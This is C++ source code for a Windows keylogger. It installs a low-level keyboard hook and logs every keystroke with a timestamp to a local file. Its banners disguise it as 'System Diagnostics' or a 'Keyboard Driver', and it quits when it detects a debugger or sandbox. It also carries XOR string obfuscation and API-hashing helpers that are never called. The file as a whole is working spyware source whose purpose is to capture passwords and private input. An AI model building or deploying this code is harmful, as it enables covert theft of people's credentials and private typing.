#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <chrono>
#include <thread>
#include <mutex>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <random>

// Global variables
std::mutex logMutex;
bool runThread = true;
HHOOK hook = NULL;
const char* logFileName = "system_logs.dat"; // Not obfuscated for simplicity

// Obfuscated string implementation
std::string Deobfuscate(const char* data, size_t size) {
    std::string result;
    for (size_t i = 0; i < size; ++i) {
        result += data[i] ^ 0x55;
    }
    return result;
}

// API hashing using FNV-1a
DWORD HashAPI(const char* api) {
    DWORD hash = 0x811C9DC5;
    while (*api) {
        hash ^= *api++;
        hash *= 0x01000193;
    }
    return hash;
}

// Resolve API by hash
template<typename T>
T ResolveAPI(DWORD hash) {
    HMODULE hModule = NULL;
    T pFunc = NULL;

    // Kernel32 is loaded in every process
    hModule = GetModuleHandleA("kernel32.dll");
    if (!hModule) return NULL;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pNames = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
    WORD* pOrdinals = (WORD*)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);
    DWORD* pFunctions = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)hModule + pNames[i]);
        if (HashAPI(name) == hash) {
            pFunc = (T)((BYTE*)hModule + pFunctions[pOrdinals[i]]);
            break;
        }
    }

    return pFunc;
}

// Define function pointers using API hashing
typedef HHOOK(WINAPI* _SetWindowsHookExA)(int, HOOKPROC, HINSTANCE, DWORD);
typedef LRESULT(WINAPI* _CallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
typedef BOOL(WINAPI* _UnhookWindowsHookEx)(HHOOK);
typedef BOOL(WINAPI* _GetMessageA)(LPMSG, HWND, UINT, UINT);
typedef BOOL(WINAPI* _TranslateMessage)(const MSG*);
typedef LRESULT(WINAPI* _DispatchMessageA)(const MSG*);
typedef SHORT(WINAPI* _GetAsyncKeyState)(int);
typedef int(WINAPI* _MapVirtualKeyA)(UINT, UINT);

// Banner text
const std::vector<std::string> banners = {
    "\n[!] Silent Observer Activated [!]",
    "\n[!] System Diagnostics Running [!]",
    "\n[!] Keyboard Driver Initialized [!]",
    "\n[!] Input Monitoring Service Started [!]"
};

// Get current timestamp
std::string GetTimestamp() {
    auto now = std::chrono::system_clock::now();
    auto in_time_t = std::chrono::system_clock::to_time_t(now);

    std::stringstream ss;
    ss << std::put_time(std::localtime(&in_time_t), "[%Y-%m-%d %X] ");
    return ss.str();
}

// Write to log file with timestamp
void WriteToLog(const std::string& data) {
    std::lock_guard<std::mutex> lock(logMutex);

    FILE* fp = fopen(logFileName, "a+");
    if (fp) {
        fprintf(fp, "%s%s\n", GetTimestamp().c_str(), data.c_str());
        fclose(fp);
    }
}

// Enhanced key capture with special characters
std::string GetKeyName(DWORD vkCode) {
    BYTE keyboardState[256];
    if (!GetKeyboardState(keyboardState)) return "[UNKNOWN]";

    // Handle shift key state
    bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

    if (isCapsLockOn && vkCode >= 0x41 && vkCode <= 0x5A) {
        isShiftPressed = !isShiftPressed;
    }

    // Handle special cases
    switch (vkCode) {
    case VK_SPACE: return " ";
    case VK_RETURN: return "[ENTER]";
    case VK_BACK: return "[BACKSPACE]";
    case VK_TAB: return "[TAB]";
    case VK_ESCAPE: return "[ESC]";
    case VK_LCONTROL: return "[L-CTRL]";
    case VK_RCONTROL: return "[R-CTRL]";
    case VK_LSHIFT: return "[L-SHIFT]";
    case VK_RSHIFT: return "[R-SHIFT]";
    case VK_LMENU: return "[L-ALT]";
    case VK_RMENU: return "[R-ALT]";
    case VK_LWIN: return "[L-WIN]";
    case VK_RWIN: return "[R-WIN]";
    case VK_APPS: return "[APPS]";
    case VK_PRIOR: return "[PGUP]";
    case VK_NEXT: return "[PGDN]";
    case VK_END: return "[END]";
    case VK_HOME: return "[HOME]";
    case VK_LEFT: return "[LEFT]";
    case VK_UP: return "[UP]";
    case VK_RIGHT: return "[RIGHT]";
    case VK_DOWN: return "[DOWN]";
    case VK_INSERT: return "[INS]";
    case VK_DELETE: return "[DEL]";
    case VK_NUMLOCK: return "[NUMLOCK]";
    case VK_SCROLL: return "[SCROLLLOCK]";
    case VK_PAUSE: return "[PAUSE]";
    case VK_SNAPSHOT: return "[PRTSC]";
    case VK_ADD: return "+";
    case VK_SUBTRACT: return "-";
    case VK_MULTIPLY: return "*";
    case VK_DIVIDE: return "/";
    case VK_DECIMAL: return ".";
    case VK_OEM_1: return isShiftPressed ? ":" : ";";
    case VK_OEM_2: return isShiftPressed ? "?" : "/";
    case VK_OEM_3: return isShiftPressed ? "~" : "`";
    case VK_OEM_4: return isShiftPressed ? "{" : "[";
    case VK_OEM_5: return isShiftPressed ? "|" : "\\";
    case VK_OEM_6: return isShiftPressed ? "}" : "]";
    case VK_OEM_7: return isShiftPressed ? "\"" : "'";
    case VK_OEM_PLUS: return isShiftPressed ? "+" : "=";
    case VK_OEM_COMMA: return isShiftPressed ? "<" : ",";
    case VK_OEM_MINUS: return isShiftPressed ? "_" : "-";
    case VK_OEM_PERIOD: return isShiftPressed ? ">" : ".";
    }

    // Handle numbers and special characters when shift is pressed
    if (vkCode >= 0x30 && vkCode <= 0x39) {
        if (isShiftPressed) {
            switch (vkCode) {
            case 0x30: return ")";
            case 0x31: return "!";
            case 0x32: return "@";
            case 0x33: return "#";
            case 0x34: return "$";
            case 0x35: return "%";
            case 0x36: return "^";
            case 0x37: return "&";
            case 0x38: return "*";
            case 0x39: return "(";
            }
        }
        else {
            return std::string(1, (char)vkCode);
        }
    }

    // Handle numpad keys
    if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9) {
        return std::to_string(vkCode - VK_NUMPAD0);
    }

    // Map virtual key to character
    char buffer[10] = { 0 };
    int result = MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
    if (result != 0) {
        if (isShiftPressed) {
            buffer[0] = (char)toupper(result);
        }
        else {
            buffer[0] = (char)tolower(result);
        }
        return buffer;
    }

    return "[VK_" + std::to_string(vkCode) + "]";
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

        if (p->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
            runThread = false;

            if (hook) {
                UnhookWindowsHookEx(hook);
            }

            WriteToLog("[!] Monitoring service terminated by user request");
            PostQuitMessage(0);
            return 0;
        }

        std::string keyName = GetKeyName(p->vkCode);
        WriteToLog("Key pressed: " + keyName);
    }

    return CallNextHookEx(hook, code, wParam, lParam);
}

// Anti-debugging and sandbox detection
void PerformEvasionChecks() {
    // Check for debugger presence
    if (IsDebuggerPresent()) {
        ExitProcess(0);
    }

    // Check for sandbox by looking at uptime
    if (GetTickCount() < 300000) { // Less than 5 minutes
        ExitProcess(0);
    }

    // Check CPU cores (sandboxes often have few)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        ExitProcess(0);
    }
}


int main() {
    
    PerformEvasionChecks();

    // Display random banner
    srand(GetTickCount());
    std::string banner = banners[rand() % banners.size()];
    printf("%s\n", banner.c_str());
    WriteToLog(banner);

    // Install the hook
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hook) {
        WriteToLog("[ERROR] Failed to install keyboard hook");
        return 1;
    }

    WriteToLog("[+] Keyboard monitoring service initialized successfully");
    printf("\n[+] System monitoring active. Press CTRL+ESC to terminate.\n");

    // Message loop
    MSG msg;
    while (runThread && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        // Small delay to reduce CPU usage
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    WriteToLog("[!] Monitoring service stopped");
    return 0;
}
